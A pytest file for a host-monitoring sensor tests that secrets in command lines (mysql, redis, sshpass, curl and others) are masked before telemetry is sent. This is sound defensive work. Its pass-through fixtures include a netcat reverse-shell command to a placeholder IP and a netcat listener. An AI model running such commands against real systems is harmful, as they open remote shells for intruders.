"""Audit #70: secrets passed as separate argv elements must be masked before a command line leaves the host."""

from __future__ import annotations

import socket
from collections import namedtuple
from contextlib import contextmanager
from types import SimpleNamespace
from typing import Any

import psutil
import pytest

from tokiwa.copilot.tools import event_brief
from tokiwa.db.models.telemetry import EventRow
from tokiwa.sensors.cmdline import MASK, mask_argv
from tokiwa.sensors.host import HostSensor
from tokiwa.util import utcnow

SECRET = "S3cr3tPass"

# The audit's evidence list plus the neighbouring forms of the same tools.
LEAKS = [
    "mysql -u root -pS3cr3tPass db",
    "mysqldump -uroot -p'S3cr3tPass' app",
    "redis-server --requirepass S3cr3tPass",
    "redis-cli -a S3cr3tPass ping",
    "sshpass -p S3cr3tPass ssh root@10.0.0.1",
    "curl -u admin:S3cr3tPass https://10.0.0.9/",
    "curl --user=admin:S3cr3tPass https://10.0.0.9/",
    "app --db-password S3cr3tPass",
    "node server.js --api-key S3cr3tPass",
    "app --passphrase=S3cr3tPass",
    "ARTEX_KEY=S3cr3tPass ./run",
    "docker run -e STRIPE_KEY=S3cr3tPass img",
    "redis-cli -u redis://:S3cr3tPass@10.0.0.2:6379",
    "smbclient //fs/share -U admin%S3cr3tPass",
    "openssl enc -aes256 -k S3cr3tPass -passin pass:S3cr3tPass",
    "mongosh -u app -p S3cr3tPass",
    "tool --auth-token S3cr3tPass --client-secret S3cr3tPass",
]


@pytest.mark.parametrize("line", LEAKS)
def test_secret_values_are_masked(line: str) -> None:
    out = mask_argv(line)
    assert SECRET not in out
    assert MASK in out or "[REDACTED:cred]" in out
    assert out.split(" ", 1)[0] == line.split(" ", 1)[0] or line.startswith("ARTEX_KEY")  # program kept
    assert mask_argv(out) == out  # idempotent


@pytest.mark.parametrize(
    "line",
    [
        "ssh -p 2222 -i /root/.ssh/id_rsa user@host",  # -p is a port outside the listed programs
        "nc -lvp 4444",
        "nc -e /bin/sh 203.0.113.66 4444",
        "docker run -p 80:80 img:1.25@sha256:abcd",
        "mysql -p db",  # bare -p prompts; ``db`` is the database
        "/usr/sbin/mysqld --defaults-file=/etc/mysql/my.cnf",
        "mongod --auth --bind_ip 0.0.0.0",
        "app --token-file /run/secrets/t --password-file=/run/secrets/p --os-auth-url https://keystone/v3",
        "app --password /run/secrets/db",  # a path is what detection needs
        "docker login -u bot --password-stdin registry.example.com",
        "nginx -g daemon off;",
        "python3 -m http.server 8000",
        "env PATH=/usr/bin HOME=/root bash -i",
    ],
)
def test_ports_paths_and_programs_survive(line: str) -> None:
    assert mask_argv(line) == line


def test_wrapped_command_gets_its_own_rules() -> None:
    out = mask_argv(["sshpass", "-p", SECRET, "ssh", "-p", "2222", "root@10.0.0.1"])
    assert out == f"sshpass -p {MASK} ssh -p 2222 root@10.0.0.1"


def test_argv_elements_with_spaces_are_scanned() -> None:
    out = mask_argv(["bash", "-c", f"mysql -uroot -p{SECRET} db && echo ok"])
    assert SECRET not in out and out.startswith("bash -c mysql -uroot -p")


_sconn = namedtuple("_sconn", ["fd", "family", "type", "laddr", "raddr", "status", "pid"])


class _Proc:
    def __init__(self, info: dict[str, Any]) -> None:
        self._info = info

    @contextmanager
    def oneshot(self) -> Any:
        yield

    def __getattr__(self, name: str) -> Any:
        return lambda: self._info[name]


def fake_psutil(procs: dict[int, dict[str, Any]]) -> SimpleNamespace:
    sockets = [_sconn(3, socket.AF_INET, socket.SOCK_STREAM, ("0.0.0.0", 6379), (), "LISTEN", 7)]
    return SimpleNamespace(
        net_connections=lambda kind="inet": sockets,
        net_if_addrs=lambda: {},
        Process=lambda pid: _Proc(procs[pid]),
        process_iter=lambda: [],
        AccessDenied=psutil.AccessDenied,
        NoSuchProcess=psutil.NoSuchProcess,
        ZombieProcess=psutil.ZombieProcess,
    )


def _proc_table(cmdline: list[str]) -> dict[int, dict[str, Any]]:
    return {
        7: {"name": "redis-server", "exe": "/usr/bin/redis-server", "cmdline": cmdline, "username": "redis"}
    }


def test_host_sensor_masks_cmdline_and_can_withhold_it() -> None:
    procs = _proc_table(["/usr/bin/redis-server", "*:6379", "--requirepass", SECRET])
    sensor = HostSensor("s", "h", ephemeral_range=(32768, 60999), psutil_module=fake_psutil(procs))
    proc = sensor.collect_events()[0].port.listeners[0].process  # type: ignore[union-attr]
    assert proc is not None and proc.name == "redis-server" and proc.exe == "/usr/bin/redis-server"
    assert proc.cmdline == f"/usr/bin/redis-server *:6379 --requirepass {MASK}"

    quiet = HostSensor(
        "s",
        "h",
        ephemeral_range=(32768, 60999),
        send_cmdline=False,
        psutil_module=fake_psutil(procs),
    )
    proc = quiet.collect_events()[0].port.listeners[0].process  # type: ignore[union-attr]
    assert proc is not None and proc.cmdline is None and proc.name == "redis-server"


def test_copilot_event_brief_masks_cmdline_from_older_agents() -> None:
    row = EventRow(
        id="e1",
        timestamp=utcnow(),
        kind="connection",
        dataset="host.connections",
        data={"process": {"pid": 7, "name": "redis-cli", "cmdline": f"redis-cli -a {SECRET} ping"}},
    )
    brief = event_brief(row)
    assert brief["process"]["name"] == "redis-cli"
    assert SECRET not in brief["process"]["cmdline"]
